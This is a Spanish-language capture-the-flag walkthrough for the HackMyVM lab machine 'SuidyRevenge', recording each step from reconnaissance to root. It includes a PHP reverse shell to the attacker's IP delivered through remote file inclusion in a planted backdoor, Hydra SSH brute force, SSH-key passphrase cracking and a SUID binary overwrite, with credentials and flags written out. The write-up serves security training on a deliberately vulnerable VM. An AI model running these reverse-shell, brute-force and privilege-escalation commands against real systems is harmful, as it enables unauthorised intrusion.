# 🖥️ SuidyRevenge - HackMyVM

> **Dificultad:** Medium  
> **OS:** Debian (Buster)  
> **IP:** 192.168.0.19 (luego 192.168.0.10 tras reset)  
> **Fecha:** 2026-05-03

---

## 📡 Reconocimiento

```bash
sudo arp-scan -l
nmap -p- --open -sS --min-rate 5000 -n -Pn 192.168.0.19 -oN allports.txt
nmap -sCV -p 22,80 192.168.0.19 -oN targeted.txt
```

**Puertos abiertos:**
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 7.9p1 Debian |
| 80/tcp | HTTP | nginx 1.14.2 |

---

## 🌐 Enumeración Web

```bash
curl http://192.168.0.19
```

**Hallazgo en index.html:**
```
Im proud to announce that "theuser" is not anymore in our servers.
Our admin "mudra" is the best admin of the world.
-suidy
```

**Usuarios identificados:** `suidy`, `mudra`, `theuser`

**Comentario HTML oculto:**
```html
<!--
"mudra" is not the best admin, IM IN!!!!
He only changed my password to a different but I had time
to put 2 backdoors (.php) from my KALI into /supersecure to keep the access!
-theuser
-->
```

### Búsqueda de backdoors

```bash
# Primer backdoor (wordlist estándar)
gobuster dir -u http://192.168.0.19/supersecure -w /usr/share/seclists/Web-Shells/backdoor_list.txt -mc 200
# → simple-backdoor.php

# Segundo backdoor via webshell
curl -X POST "http://192.168.0.19/supersecure/simple-backdoor.php" -d "cmd=ls"
# → mysuperbackdoor.php
```

**IMPORTANTE:** `simple-backdoor.php` solo ejecuta comandos via **POST** y sin espacios no funciona con `-d`. Usar `--data-urlencode`.

---

## 💣 Acceso Inicial — RFI via mysuperbackdoor.php

El segundo backdoor usa el parámetro `file` y acepta URLs (Remote File Inclusion).

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — payload PHP en Kali
echo '<?php system("bash -c '"'"'bash -i >& /dev/tcp/192.168.0.42/4444 0>&1'"'"'"); ?>' > /tmp/shell.php
cd /tmp && python3 -m http.server 8080

# Terminal 3 — disparar RFI
curl "http://192.168.0.19/supersecure/mysuperbackdoor.php?file=http://192.168.0.42:8080/shell.php"
```

**Shell obtenida:** `www-data`

### Estabilizar shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 🔍 Enumeración interna

```bash
# Nota accesible por www-data
cat /var/www/html/murdanote.txt
# → "Im using one password from rockyou.txt! -murda"

# Clave SSH de violent en ubicación inusual
find / -name "id_rsa*" 2>/dev/null
# → /usr/games/id_rsa
```

---

## 👥 Escalada horizontal — murda → violent → theuser

### 1. murda (hydra + rockyou)

```bash
hydra -l murda -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.19 -t 4 -I
# → murda:iloveyou
```

```bash
ssh murda@192.168.0.19
cat ~/secret.txt
# → La clave id_rsa está en /usr/games/id_rsa para theuser. rockyou is your friend!
cat /usr/games/id_rsa  # Copiar a Kali
```

### 2. Crackear passphrase de la clave

```bash
chmod 600 /tmp/theuser_rsa
ssh2john /tmp/theuser_rsa > /tmp/theuser_rsa.hash
john /tmp/theuser_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
# → ihateu
```

### 3. violent (clave SSH de /usr/games/id_rsa)

```bash
ssh -i /tmp/theuser_rsa violent@192.168.0.19
# Passphrase: ihateu
```

**Binario SUID interesante:**
```bash
strings /usr/bin/violent
# → WhatImdoingWithMyLifeGOD (contraseña embebida, no usada directamente)
```

### 4. theuser (password brute force)

```bash
# Desde sesión violent
ssh theuser@192.168.0.19
# Password: different  (encontrada con hydra/rockyou)
```

**Flag user:** `HMVbisoususeryay` (en `/home/theuser/user.txt`)

---

## 🔺 Escalada de Privilegios — theuser → root

### Enumeración SUID

```bash
find / -perm -4000 -type f 2>/dev/null
# → /home/suidy/suidyyyyy  (-rwsrws--- 1 root theuser 16712)
# → /usr/bin/violent       (-rwsr-sr-x 1 root violent)
```

**Clave:** `suidyyyyy` tiene SUID root + grupo theuser con **write**. Un cron de root restaura el SUID cada minuto verificando el tamaño (16712 bytes).

### Exploit — cp en sitio + esperar cron

```bash
# Como theuser — compilar binario malicioso del mismo tamaño
printf '#include <unistd.h>\nint main(){setuid(0);setgid(0);execl("/bin/bash","bash","-p",NULL);return 0;}' > /tmp/evil.c
gcc /tmp/evil.c -o /tmp/evil
truncate -s 16712 /tmp/evil

# Sobrescribir EN SITIO (sin rm) para mantener owner=root
cp /tmp/evil /home/suidy/suidyyyyy

# Esperar al cron (~1 minuto)
watch -n 5 ls -la /home/suidy/suidyyyyy
# Cuando aparezca -rwsrws--- 1 root theuser → ejecutar
/home/suidy/suidyyyyy
```

**Flag root:** `HMVvoilarootlala` (en `/root/root.txt`)

---

## ⚠️ Lecciones aprendidas

| Error | Consecuencia | Solución |
|-------|-------------|----------|
| Ejecutar `suidyyyyy` antes de copiar | "Text file busy" al intentar sobrescribir | Copiar PRIMERO, luego ejecutar |
| Usar `rm` + `cp` en vez de `cp` directo | El owner cambia de root a theuser, SUID inútil | Siempre `cp` en sitio para preservar owner |
| `simple-backdoor.php` con GET | Comandos sin output | Usar POST con `--data-urlencode` |

---

## 📋 Resumen

| Fase | Técnica | Credencial |
|------|---------|------------|
| Reconocimiento | nmap, arp-scan | — |
| Enumeración web | gobuster, curl, HTML comments | — |
| Acceso inicial | RFI via mysuperbackdoor.php | www-data |
| Lateral: murda | Hydra + rockyou | murda:iloveyou |
| Lateral: violent | SSH key + john | passphrase:ihateu |
| Lateral: theuser | Hydra + rockyou | theuser:different |
| Root | SUID cron abuse (cp in-place) | root |

---

## 🔗 Cadena completa

```
RFI (www-data) → murda (iloveyou) → violent (id_rsa:ihateu) → theuser (different) → root (SUID cron)
```
